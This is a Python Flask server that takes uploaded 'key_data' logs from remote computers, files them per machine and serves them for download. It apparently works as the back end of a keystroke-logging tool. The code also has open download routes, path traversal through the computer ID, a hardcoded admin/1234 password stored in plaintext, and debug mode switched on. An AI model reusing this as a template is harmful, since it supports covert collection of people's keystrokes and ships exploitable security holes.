from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
from datetime import datetime

# Initialize Flask app
app = Flask(__name__)
CORS(app)

# 📌 Storage directory
SAVE_DIR = "received_files"
os.makedirs(SAVE_DIR, exist_ok=True)  # Create directory if it doesn't exist

# ==============================
# 🔹 Utility Functions
# ==============================

def save_logs(computer_id, logs):
    """Saves logs to a file using the correct timestamps from the client."""
    try:
        today_date = datetime.today().strftime("%Y-%m-%d")
        computer_dir = os.path.join(SAVE_DIR, computer_id)
        os.makedirs(computer_dir, exist_ok=True)
        file_path = os.path.join(computer_dir, f"{today_date}.jsonl")

        with open(file_path, "a", encoding="utf-8") as f:
            for log in logs:
                # 🔹 Use the timestamp sent by the client
                log_entry = {
                    "timestamp": log["timestamp"],  # Keep the correct timestamp
                    "key_data": log["key_data"]
                }
                json.dump(log_entry, f)
                f.write("\n")

        print(f"✅ Logs saved for {computer_id} in {file_path}")
        return True
    except Exception as e:
        print(f"❌ Error saving logs: {e}")
        return False

# ==============================
# 🔹 Flask Routes
# ==============================

@app.route('/upload', methods=['POST'])
def upload_json():
    """Receives logs from a computer and stores them."""
    try:
        data = request.get_json()
        if not isinstance(data, dict):
            return jsonify({"error": "Invalid JSON format"}), 400

        computer_id = data.get("computer_id")
        logs = data.get("logs")

        if not isinstance(computer_id, str) or not isinstance(logs, list):
            return jsonify({"error": "Invalid JSON structure"}), 400

        # Validate logs format
        for log_data in logs:
            if not isinstance(log_data, dict) or 'key_data' not in log_data:
                return jsonify({"error": "Invalid log format"}), 400

        # Save logs to file
        if save_logs(computer_id, logs):
            return jsonify({"message": "Logs stored successfully"}), 200
        else:
            return jsonify({"error": "Failed to save logs"}), 500

    except Exception as e:
        print(f"❌ Server error: {e}")
        return jsonify({"error": f"Server error: {e}"}), 500

@app.route('/computers', methods=['GET'])
def get_computers():
    """Returns a list of registered computers."""
    try:
        computers = [d for d in os.listdir(SAVE_DIR) if os.path.isdir(os.path.join(SAVE_DIR, d))]
        return jsonify({"computers": computers}), 200
    except Exception as e:
        print(f"❌ Server error: {e}")
        return jsonify({"error": f"Server error: {e}"}), 500

@app.route('/download/<computer_id>', methods=['GET'])
def download_json(computer_id):
    """Downloads all logs from a specific computer in JSON Lines format."""
    try:
        computer_dir = os.path.join(SAVE_DIR, computer_id)
        if not os.path.exists(computer_dir):
            return jsonify({"error": "No logs found for this computer"}), 404

        logs = []
        for file in sorted(os.listdir(computer_dir)):
            file_path = os.path.join(computer_dir, file)
            if file.endswith(".jsonl"):  # 📌 Only read JSON Lines files
                with open(file_path, "r", encoding="utf-8") as f:
                    for line in f:
                        logs.append(json.loads(line))  # 📌 Convert each line to a JSON object

        return jsonify(logs), 200  # Return an array of logs

    except Exception as e:
        print(f"❌ Server error: {e}")
        return jsonify({"error": f"Server error: {e}"}), 500

# ==============================
# 🔹 Authentication Route
# ==============================

# 📌 Fake users database
USERS_FILE = os.path.join(SAVE_DIR, "users.json")

def load_users():
    """Load user credentials from a file or create a default one."""
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data.get("users", {})
        except json.JSONDecodeError:
            print("❌ Error reading users file, resetting to default.")
    return {"admin": "1234"}  # Default user

def save_users(users):
    """Save user credentials to a file."""
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump({"users": users}, f, indent=4)

# Load users at startup
users = load_users()

@app.route('/login', methods=['POST'])
def login():
    """Verifies user credentials."""
    try:
        data = request.get_json()
        username = data.get("username")
        password = data.get("password")

        if users.get(username) == password:
            print(f"✅ Successful login for user: {username}")
            return jsonify({"message": "Login successful"}), 200
        else:
            print(f"❌ Failed login attempt for user: {username}")
            return jsonify({"error": "Invalid credentials"}), 401

    except Exception as e:
        print(f"❌ Server error: {e}")
        return jsonify({"error": f"Server error: {e}"}), 500

# ==============================
# 🔹 Run Flask Application
# ==============================

if __name__ == '__main__':
    print("🚀 Server is running on http://127.0.0.1:5000")
    app.run(debug=True)
